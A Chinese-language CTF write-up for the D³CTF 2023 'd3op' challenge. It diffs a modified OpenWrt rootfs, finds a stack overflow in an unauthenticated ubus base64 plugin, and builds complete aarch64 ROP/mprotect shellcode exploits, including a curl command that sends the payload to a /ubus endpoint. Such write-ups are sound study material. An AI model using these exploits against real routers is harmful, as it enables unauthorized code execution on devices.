# AntCTF x D³CTF 2023 d3op复盘笔记

> 原文: https://www.ctfiot.com/116000.html
> ID: 116000

d3op
It might take a long time to start up, please connect about 2 minutes after the gambox start.

HINTS:
May be you need to do a diff with the rootfs in attachment.

题目文件：https://github.com/z1r00/ctf-pwn/blob/main/AntCTF%20x%20D%C2%B3CTF/d3op/d3op-attachment-d362854d3418636059155138fd58997c.zip

一

初步分析

把题目给的固件进行解包，然后发现是Openwrt 22.03.3。

_______ ________ __
 | |.-----.-----.-----.| | | |.----.| |_
 | - || _ | -__| || | | || _|| _|
 |_______|| __|_____|__|__||________||__| |____|
 |__| W I R E L E S S F R E E D O M
 -----------------------------------------------------
 OpenWrt 22.03.3, r20028-43d71ad93e
 -----------------------------------------------------

给的HINTS是diff一下，那就再从官网上下载一个22.03.3然后diff一下，diff结果如下：

diff: openwrt/squashfs-root/etc/TZ: No such file or directory
Only in d3op/squashfs-root/etc/config: network
diff: openwrt/squashfs-root/etc/localtime: No such file or directory
diff: openwrt/squashfs-root/etc/mtab: No such file or directory
diff: openwrt/squashfs-root/etc/ppp/resolv.conf: No such file or directory
diff: openwrt/squashfs-root/etc/resolv.conf: No such file or directory
diff --color -aur openwrt/squashfs-root/etc/shadow d3op/squashfs-root/etc/shadow
--- openwrt/squashfs-root/etc/shadow 2023-01-03 08:24:21
+++ d3op/squashfs-root/etc/shadow 2023-04-12 17:33:08
@@ -1,4 +1,4 @@
-root:::0:99999:7:::
+root:$6$JlPmKq/ZhqQ0I6V6$B74FL6cufcnZKT4G0sUz3xNP0Pr4k7yOG2I091f2OFOmcldS2s7CPJwOcfx0r/OshYDOFKw76APIqPHBXCdXb/:19442::::::
 daemon:*:0:0:99999:7:::
 ftp:*:0:0:99999:7:::
 network:*:0:0:99999:7:::
diff: openwrt/squashfs-root/etc/ssl/cert.pem: No such file or directory
Only in d3op/squashfs-root: flag
diff: openwrt/squashfs-root/sbin/insmod: No such file or directory
diff: openwrt/squashfs-root/sbin/lsmod: No such file or directory
diff: openwrt/squashfs-root/sbin/modinfo: No such file or directory
diff: openwrt/squashfs-root/sbin/modprobe: No such file or directory
diff: openwrt/squashfs-root/sbin/rmmod: No such file or directory
diff: openwrt/squashfs-root/usr/bin/scp: No such file or directory
diff: openwrt/squashfs-root/usr/bin/ssh: No such file or directory
diff: openwrt/squashfs-root/usr/bin/wget: No such file or directory
Only in d3op/squashfs-root/usr/libexec/rpcd: base64
diff --color -aur openwrt/squashfs-root/usr/share/rpcd/acl.d/unauthenticated.json d3op/squashfs-root/usr/share/rpcd/acl.d/unauthenticated.json
--- openwrt/squashfs-root/usr/share/rpcd/acl.d/unauthenticated.json 2023-01-03 08:24:21
+++ d3op/squashfs-root/usr/share/rpcd/acl.d/unauthenticated.json 2023-04-10 02:25:53
@@ -1,13 +1,17 @@
 {
- "unauthenticated": {
- "description": "Access controls for unauthenticated requests",
- "read": {
- "ubus": {
- "session": [
- "access",
- "login"
- ]
- }
- }
- }
+ "unauthenticated": {
+ "description": "Access controls for unauthenticated requests",
+ "read": {
+ "ubus": {
+ "session": [
+ "access",
+ "login"
+ ],
+ "base64": [
+ "decode",
+ "encode"
+ ]
+ }
+ }
+ }
 }

可以看到题目多了network，和base64这两个关键的东西。

Only in d3op/squashfs-root/usr/libexec/rpcd: base64

+ "unauthenticated": {
+ "description": "Access controls for unauthenticated requests",
+ "read": {
+ "ubus": {
+ "session": [
+ "access",
+ "login"
+ ],
+ "base64": [
+ "decode",
+ "encode"
+ ]
+ }
+ }
+ }

同时也得知base64是属于ubus模块。

◆OpenWrt 提供了一个系统总线ubus，它类似于Linux桌面操作系统的d-Bus，目标是提供系统级的进程间通信（IPC）功能。ubus在设计理念上与d-Bus基本保持一致，提供了系统级总线功能，与d-Bus相比减少了系统内存占用空间，这样可以适应于嵌入式Linux操作系统的低内存和低端CPU性能的特殊环境。

◆ubus是OpenWrt的RPC工具，是OpenWrt的微系统总线架构，是在2011年加入OpenWrt中的。为了提供各种后台进程和应用程序之间的通信机制，ubus工程被开发出来。

◆ubus命令用于控制调试相关ubus接口，主要命令说明如下：

- list [<path>] List objects
 - call <path> <method> [<message>] Call an object method
 - listen [<path>...] Listen for events
 - send <type> [<message>] Send an event
 - wait_for <object> [<object>...] Wait for multiple objects to appear on ubus

ubus list 即可看到当前ubus中注册的接口。

root@(none):/# ubus list
base64
container
dhcp
file
hotplug.dhcp
hotplug.iface
hotplug.neigh
hotplug.net
hotplug.ntp
hotplug.tftp
iwinfo
luci
luci-rpc
network
network.device
network.interface
network.interface.lan
network.interface.loopback
network.rrdns
network.wireless
rc
service
session
system
uci

如果想要与base64进行交互的话用call，但是需要先知道base64的输入格式是什么。

root@(none):/# ubus -v list base64
'base64' @1e449b72
 "encode":{"input":"String"}
 "decode":{"input":"String"}

知道了有两个方法，一个是encode和decode，调用如下：

root@(none):/# ubus call base64 encode '{"input" : "z1r0"}'
{
 "output": "ejFyMAA="
}

可以看到z1r0被base64编码并输出出来，漏洞点大概率就出在base64这里，至此初步分析完成。

二

漏洞分析

int __cdecl main(int argc, const char **argv, const char **envp)
{
 char v6[4096]; // [xsp+28h] [xbp-1028h] BYREF
 unsigned __int64 *specific_method; // [xsp+1028h] [xbp-28h]
 __int64 v8; // [xsp+1030h] [xbp-20h]
 __int64 *v9; // [xsp+1038h] [xbp-18h]
 int v10; // [xsp+1044h] [xbp-Ch]
 unsigned __int64 *method; // [xsp+1048h] [xbp-8h]

 init_base64(); // base64表
 if ( argc <= 1 )
 return 0;
 method = argv[1];
 if ( check_method(method, "list") )
 {
 v10 = read_input(0, v6, 0xFFFuLL);
 v6[v10] = 0;
 v9 = sub_402478(v6);
 if ( v9 )
 {
 v8 = sub_403C90(v9, "input");
 if ( v8 && sub_4059D0(v8) )
 {
 specific_method = argv[2];
 if ( !check_method(method, "call") )
 {
 ckec(specific_method, *(v8 + 32), byte_4A2098);
 sub_40B230("{"output": "%s"}n", byte_4A2098);
 sub_400A10(v9);
 }
 return 0;
 }
 else
 {
 return 0;
 }
 }
 else
 {
 return 0;
 }
 }
 else
 {
 uloop_init();
 return 0;
 }
}

主函数是参数传递逻辑，当./base64 call 的时候会进入read_input。

unsigned __int64 __fastcall sub_422E60(int a1, void *a2, size_t a3)
{
 unsigned __int64 v4; // x19
 unsigned int v8; // w3
 unsigned __int64 v9; // x19
 int v10; // w2
 int v11; // w2

 if ( byte_4A0F78 )
 {
 v4 = linux_eabi_syscall(__NR_read, a1, a2, a3);
 if ( v4 > 0xFFFFFFFFFFFFF000LL )
 {
 v10 = -v4;
 v4 = -1LL;
 *(&dword_4A8590 + _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2))) = v10;
 }
 return v4;
 }
 else
 {
 v8 = sub_444C30();
 v9 = linux_eabi_syscall(__NR_read, a1, a2, a3);
 if ( v9 > 0xFFFFFFFFFFFFF000LL )
 {
 v11 = -v9;
 v9 = -1LL;
 *(&dword_4A8590 + _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2))) = v11;
 }
 sub_444CC0(v8);
 return v9;
 }
}

read_input的逻辑就是可以继续输入一串数据，然后输入的数据进行一些处理之后会筛选出是否存在input，此时会进入下一个check逻辑。

ckec(specific_method, *(v8 + 32), byte_4A2098);
sub_40B230("{"output": "%s"}n", byte_4A2098);
sub_400A10(v9);

看一下ckec。

__int64 __fastcall sub_4064F0(unsigned __int64 *a1, __int64 a2, __int64 a3)
{
 if ( check_method(a1, "encode") )
 {
 if ( !check_method(a1, "decode") )
 decode(a2, a3);
 }
 else
 {
 encode(a2, a3);
 }
 return 0LL;
}

所以当执行./base64 call encode/decode的时候可以正常运行到encode/decode的处理逻辑。

至此，得以进入decode/encode的处理逻辑的完整命令是：

➜ squashfs-root ./base64 call encode
{"input" : "z1r0"}
{"output": "ejFyMAA="}

先看一下decode。

__int64 __fastcall decode(char *json_input, __int64 out_put)
{
 int v3; // w0
 int v4; // w0
 int v5; // w0
 int v6; // w0
 int v7; // w0
 int v8; // w0
 int v9; // w0
 int v10; // w0
 int v11; // w0
 int v12; // w0
 int v13; // w0
 char v16[1028]; // [xsp+28h] [xbp+28h]
 int v17; // [xsp+42Ch] [xbp+42Ch]
 int v18; // [xsp+430h] [xbp+430h]
 int v19; // [xsp+434h] [xbp+434h]
 int v20; // [xsp+438h] [xbp+438h]
 int v21; // [xsp+43Ch] [xbp+43Ch]
 unsigned int size; // [xsp+440h] [xbp+440h]
 unsigned int v23; // [xsp+444h] [xbp+444h]
 unsigned int v24; // [xsp+448h] [xbp+448h]
 unsigned int len; // [xsp+44Ch] [xbp+44Ch]

 size = sub_400300();
 if ( (size & 3) != 0 )
 return 0LL;
 len = 3 * (size >> 2);
 if ( json_input[size - 1] == '=' )
 --len;
 if ( json_input[size - 2] == 61 )
 --len;
 if ( out_put )
 {
 v24 = 0;
 v23 = 0;
 while ( size > v24 )
 {
 if ( json_input[v24] == 61 )
 {
 ++v24;
 v3 = 0;
 }
 else
 {
 v4 = v24++;
 v3 = byte_4A1F98[json_input[v4]];
 }
 v21 = v3;
 if ( json_input[v24] == 61 )
 {
 ++v24;
 v5 = 0;
 }
 else
 {
 v6 = v24++;
 v5 = byte_4A1F98[json_input[v6]];
 }
 v20 = v5;
 if ( json_input[v24] == 61 )
 {
 ++v24;
 v7 = 0;
 }
 else
 {
 v8 = v24++;
 v7 = byte_4A1F98[json_input[v8]];
 }
 v19 = v7;
 if ( json_input[v24] == 61 )
 {
 ++v24;
 v9 = 0;
 }
 else
 {
 v10 = v24++;
 v9 = byte_4A1F98[json_input[v10]];
 }
 v18 = v9;
 v17 = v9 + (v21 << 18) + (v20 << 12) + (v19 << 6);
 if ( len > v23 )
 {
 v11 = v23++;
 v16[v11] = BYTE2(v17);
 }
 if ( len > v23 )
 {
 v12 = v23++;
 v16[v12] = BYTE1(v17);
 }
 if ( len > v23 )
 {
 v13 = v23++;
 v16[v13] = v17;
 }
 }
 sub_4002B0();
 }
 return 0LL;
}

在decode最前面，会得到长度。如果decode的时候存在=号则len–，可以看到最后v16中的index并没有进行检查大小，导致溢出。

到此漏洞点寻找完成。

三

漏洞利用

接下来就是如何去利用这个漏洞，首先看一下保护。

Arch: aarch64-64-little
 RELRO: Partial RELRO
 Stack: No canary found
 NX: NX enabled
 PIE: No PIE (0x400000)

可以直接覆盖返回地址来劫持程序流，写出如下poc。

from pwn import *
from os import system
import base64

li = lambda x : print('x1b[01;38;5;214m' + str(x) + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + str(x) + 'x1b[0m')

file_name = './base64'

r = process([file_name, 'call', 'decode'])

def dbgg():
 raw_input()

elf = ELF(file_name)

dbgg()

p1 = b'aaaa'
p1 = p1.ljust(0x458, b"a")

p1 = base64.b64encode(p1)
ret = 0x406550

li(p1)

p2 = b'{"input":"' + p1 + b'"}'
li(p2)

r.sendline(p2)

r.interactive()

调试的时候发现会在下面这个地方SIGSEGV了。

► 0x406280 ldrb w0, [x0]
 0x406284 cmp w0, #0x3d
 0x406288 b.ne #0x4062a0 <0x4062a0>

看一下汇编。

.text:0000000000406274 E0 4B 84 B9 LDRSW X0, [SP,#0x450+var8]
.text:0000000000406278 E1 0F 40 F9 LDR X1, [SP,#0x450+var_438]
.text:000000000040627C 20 00 00 8B ADD X0, X1, X0
.text:0000000000406280 00 00 40 39 LDRB W0, [X0]
.text:0000000000406284 1F F4 00 71 CMP W0, #0x3D ; '='

X0这里的地址取错了，0x450 - 8 = 0x448 = v24，在溢出的时候把v24给覆盖了之后导致的SIGSEGV结果。

所以需要把v22 v23 v24 v25都处置正确才可以继续。

所以写了如下poc：

from pwn import *
from os import system
import base64

li = lambda x : print('x1b[01;38;5;214m' + str(x) + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + str(x) + 'x1b[0m')

file_name = './base64'

r = process([file_name, 'call', 'decode'])

def dbgg():
 raw_input()

elf = ELF(file_name)

dbgg()

p1 = b''
p1 = p1.ljust(0x418, b'a')
p1 += b'x77x77x00x00'
p1 += b'x1dx04x00x00' #0x418 + 0x4 + 1
p1 += b'x84x05x00x00' #
p1 += b'x77x07x00x00'
p1 += p64(0)
p1 += b'b' * 8

p1 = base64.b64encode(p1)
ret = 0x406550

li(p1)

p2 = b'{"input":"' + p1 + b'"}'
li(p2)

r.sendline(p2)

r.interactive()

发现可以成功控制ret为0x6262626262626262，接下来就是构造rop。

没找到system，但是发现了mprotect。

unsigned __int64 __fastcall sub_423340(void *a1, size_t a2, int a3)
{
 unsigned __int64 result; // x0
 int v4; // w1

 result = linux_eabi_syscall(__NR_mprotect, a1, a2, a3);
 if ( result >= 0xFFFFFFFFFFFFF001LL )
 {
 v4 = result;
 result = -1LL;
 *(&dword_4A8590 + _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2))) = -v4;
 }
 return result;
}

如果可以控制a1，a2，a3就可以直接分配rwx来执行shellcode，用rwctf shellfind的方法来看交叉引用，从而寻找可以控制a1 a2 a3中的一个，并且可以同时执行sub_423340的地址。

这样做的原因是因为笔者直接找借助x21 x19然后mov到x1 x2的gadgets，但是控制之后执行sub_423340会因为x21 x19的设置导致一些问题。

如果可以控制a1, a2, a3中的任何一个并且可以执行sub_423340，这个时候就可以跳到shellcode那里了。

.text:00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
.text:00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
.text:00000000004578B0 21 00 00 CB SUB X1, X1, X0
.text:00000000004578B4 80 00 00 8B ADD X0, X4, X0
.text:00000000004578B8 A2 2E FF 97 BL sub_423340

上面这一段就符合要求，控制了x19之后然后再控制x2，最后到上面这一段。

.text:00000000004579A4 E2 00 80 52 MOV W2, #7
.text:00000000004579A8 FD 03 00 91 MOV X29, SP
.text:00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
.text:00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
.text:00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
.text:00000000004579B8 21 00 00 CB SUB X1, X1, X0
.text:00000000004579BC 60 00 00 8B ADD X0, X3, X0
.text:00000000004579C0 60 2E FF 97 BL sub_423340

官方wp上的要更简单，控制x0即可，然后跳到shellcode那里。

shellcode可以用orw，下面是用base64运行时的exp，可以看到flag成功被输出。

from pwn import *
from os import system
import base64

li = lambda x : print('x1b[01;38;5;214m' + str(x) + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + str(x) + 'x1b[0m')

context(arch='aarch64', os='linux', log_level='debug')

file_name = './base64'

r = process([file_name, 'call', 'decode'])

def dbgg():
 raw_input()

elf = ELF(file_name)

dbgg()

shellcode = shellcraft.aarch64.linux.open("/flag", 0)
shellcode += shellcraft.aarch64.linux.read(3, 0x4a2098, 0x100)
shellcode += shellcraft.aarch64.linux.write(1, 0x4a2098, 0x100)
p1 = asm(shellcode)
p1 = p1.ljust(0x200, b'a')
p1 += p64(0) + p64(0x4A3000) + p64(0x4A0000)
p1 = p1.ljust(0x418, b'a')
p1 += b'x77x77x00x00'
p1 += b'x1dx04x00x00' #0x418 + 0x4 + 1
p1 += b'x84x05x00x00' #
p1 += b'x77x07x00x00'
p1 += p64(0)

# 0x000000000040064c : ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
gadget1 = 0x000000000040064c

# 0x0000000000417920 : ldr x21, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret
gadget2 = 0x0000000000417920

# 0x000000000040a95c : ldr x23, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret
gadget3 = 0x000000000040a95c

# 0x00000000004598c0 : ldp x19, x20, [sp, #0x10] ; mov x0, x3 ; ldp x29, x30, [sp], #0x50 ; ret
gadget4 = 0x00000000004598c0

# 0x0000000000444e14 : svc #0 ; ldp x21, x22, [sp, #0x20] ; mov w0, w19 ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x40 ; ret
gadget6 = 0x0000000000444e14
# 0x435338
gadget5 = 0x435338
'''
mov x1, x23
mov x0, x19
mov x2, x21
blr x20
'''

'''
.text:00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
.text:00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
.text:00000000004578B0 21 00 00 CB SUB X1, X1, X0
.text:00000000004578B4 80 00 00 8B ADD X0, X4, X0
.text:00000000004578B8 A2 2E FF 97 BL sub_423340
'''

'''
.text:00000000004579A4 E2 00 80 52 MOV W2, #7
.text:00000000004579A8 FD 03 00 91 MOV X29, SP
.text:00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
.text:00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
.text:00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
.text:00000000004579B8 21 00 00 CB SUB X1, X1, X0
.text:00000000004579BC 60 00 00 8B ADD X0, X3, X0
.text:00000000004579C0 60 2E FF 97 BL sub_423340
'''
magic_gadget = 0x00000000004579A4

# 0x0000000000400898 : ldr x0, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret
gadget7 = 0x0000000000400898

mprotect_addr = 0x423340
base64_decode_addr = 0x4a2098
#p1 += p64(0x00000000004579A4)
#p1 += p64(0x0000000000403ad8)
'''
p1 += p64(gadget4)
p1 += b'x00' * 0x20
p1 += p64(0) + p64(gadget1)
p1 += p64(0) + p64(mprotect_addr)
p1 += b'x00' * 0x30
p1 += p64(0) + p64(gadget2)
p1 += p64(0x4a2000) # x19
p1 += p64(0) * 2 + p64(gadget3)
p1 += p64(0) * 2 + p64(7) # x21
p1 += p64(0)
p1 += p64(0) + p64(base64_decode_addr)
p1 += p64(0) * 4 + p64(0x7000)
'''
p1 += p64(gadget7)
p1 += b'x00' * 0x20
p1 += p64(0) + p64(magic_gadget)
p1 += p64(0) * 2 + p64(base64_decode_addr + 0x200 - 0x490)
p1 += p64(base64_decode_addr) * 5

p1 = base64.b64encode(p1)
ret = 0x406550

li(p1)

p2 = b'{"input":"' + p1 + b'"}'
li(p2)

r.sendline(p2)

r.interactive()

但是远程的时候会出现问题。

* Trying 127.0.0.1:9999...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 9999 (#0)
> POST /ubus HTTP/1.1
> Host: 127.0.0.1:9999
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Length: 1721
> Content-Type: application/x-www-form-urlencoded
> Expect: 100-continue
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 100 Continue
* We are completely uploaded and fine
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Connection: Keep-Alive
< Transfer-Encoding: chunked
< Keep-Alive: timeout=20
< Content-Type: application/json
<
* Connection #0 to host 127.0.0.1 left intact
{"jsonrpc":"2.0","id":null,"result":[2]}

result里没有flag的输出，是因为输出的格式是{"output":"flag"}，而上面的0x4a2098这里直接存放的是flag，所以需要在一个地址里构造一下{"output": "，然后再将flag放到后面，最后加上"}即可。

最终本地exp如下：

from pwn import *
from os import system
import base64

li = lambda x : print('x1b[01;38;5;214m' + str(x) + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + str(x) + 'x1b[0m')

context(arch='aarch64', os='linux', log_level='debug')

file_name = './base64'

r = process([file_name, 'call', 'decode'])

def dbgg():
 raw_input()

elf = ELF(file_name)

dbgg()

shellcode = shellcraft.aarch64.linux.open("/flag", 0)
shellcode += shellcraft.aarch64.linux.read(3, 0x4a23a4, 0x100)
shellcode += shellcraft.aarch64.linux.write(1, 0x4a2398, 0x100)
p1 = asm(shellcode)
p1 = p1.ljust(0x200, b'a')
p1 += p64(0) + p64(0x4A3000) + p64(0x4A0000)
p1 = p1.ljust(0x300, b'a')
p1 += b'{"output": "'
p1 = p1.ljust(0x350, b'a')
p1 += b'"}'
p1 = p1.ljust(0x418, b'a')
p1 += b'x77x77x00x00'
p1 += b'x1dx04x00x00' #0x418 + 0x4 + 1
p1 += b'x84x05x00x00' #
p1 += b'x77x07x00x00'
p1 += p64(0)

# 0x000000000040064c : ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
gadget1 = 0x000000000040064c

# 0x0000000000417920 : ldr x21, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret
gadget2 = 0x0000000000417920

# 0x000000000040a95c : ldr x23, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret
gadget3 = 0x000000000040a95c

# 0x00000000004598c0 : ldp x19, x20, [sp, #0x10] ; mov x0, x3 ; ldp x29, x30, [sp], #0x50 ; ret
gadget4 = 0x00000000004598c0

# 0x0000000000444e14 : svc #0 ; ldp x21, x22, [sp, #0x20] ; mov w0, w19 ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x40 ; ret
gadget6 = 0x0000000000444e14
# 0x435338
gadget5 = 0x435338
'''
mov x1, x23
mov x0, x19
mov x2, x21
blr x20
'''

'''
.text:00000000004578A8 61 EE 41 F9 LDR X1, [X19,#0x3D8]
.text:00000000004578AC 60 F2 41 F9 LDR X0, [X19,#0x3E0]
.text:00000000004578B0 21 00 00 CB SUB X1, X1, X0
.text:00000000004578B4 80 00 00 8B ADD X0, X4, X0
.text:00000000004578B8 A2 2E FF 97 BL sub_423340
'''

'''
.text:00000000004579A4 E2 00 80 52 MOV W2, #7
.text:00000000004579A8 FD 03 00 91 MOV X29, SP
.text:00000000004579AC 03 48 42 F9 LDR X3, [X0,#0x490]
.text:00000000004579B0 01 4C 42 F9 LDR X1, [X0,#0x498]
.text:00000000004579B4 00 50 42 F9 LDR X0, [X0,#0x4A0]
.text:00000000004579B8 21 00 00 CB SUB X1, X1, X0
.text:00000000004579BC 60 00 00 8B ADD X0, X3, X0
.text:00000000004579C0 60 2E FF 97 BL sub_423340
'''
magic_gadget = 0x00000000004579A4

# 0x0000000000400898 : ldr x0, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret
gadget7 = 0x0000000000400898

mprotect_addr = 0x423340
base64_decode_addr = 0x4a2098
#p1 += p64(0x00000000004579A4)
#p1 += p64(0x0000000000403ad8)
'''
p1 += p64(gadget4)
p1 += b'x00' * 0x20
p1 += p64(0) + p64(gadget1)
p1 += p64(0) + p64(mprotect_addr)
p1 += b'x00' * 0x30
p1 += p64(0) + p64(gadget2)
p1 += p64(0x4a2000) # x19
p1 += p64(0) * 2 + p64(gadget3)
p1 += p64(0) * 2 + p64(7) # x21
p1 += p64(0)
p1 += p64(0) + p64(base64_decode_addr)
p1 += p64(0) * 4 + p64(0x7000)
'''
p1 += p64(gadget7)
p1 += b'x00' * 0x20
p1 += p64(0) + p64(magic_gadget)
p1 += p64(0) * 2 + p64(base64_decode_addr + 0x200 - 0x490)
p1 += p64(base64_decode_addr) * 5

p1 = base64.b64encode(p1)
ret = 0x406550

li(p1)

p2 = b'{"input":"' + p1 + b'"}'
li(p2)

r.sendline(p2)

r.interactive()

远程如下：

from pwn import *
from os import system

li = lambda x : print('x1b[01;38;5;214m' + str(x) + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + str(x) + 'x1b[0m')

ip = 'http://127.0.0.1:9999/ubus'

p1 = '7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADUIACA0gFzhNJBCaDyAiCA0ggIgNIBAADUYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAAAAAAAAwSgAAAAAAAABKAAAAAABhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFheyJvdXRwdXQiOiAiYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEifWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYXd3AAAdBAAAhAUAAHcHAAAAAAAAAAAAAJgIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKR5RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAgeSgAAAAAAmCBKAAAAAACYIEoAAAAAAJggSgAAAAAAmCBKAAAAAACYIEoAAAAAAA=='

shell = '''curl -v -d '{"jsonrpc":"2.0","id":null, "method":"call", "params" : ["00000000000000000000000000000000", "base64", "decode", {"input" : "''' + p1 + '''"}]}' ''' + ip

li(shell)

system(shell)

远程交互如下：

curl -v -d '{"jsonrpc":"2.0","id":null, "method":"call", "params" : ["00000000000000000000000000000000", "base64", "decode", {"input" : "7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADUIACA0gFzhNJBCaDyAiCA0ggIgNIBAADUYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAAAAAAAAwSgAAAAAAAABKAAAAAABhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFheyJvdXRwdXQiOiAiYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEifWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYXd3AAAdBAAAhAUAAHcHAAAAAAAAAAAAAJgIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKR5RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAgeSgAAAAAAmCBKAAAAAACYIEoAAAAAAJ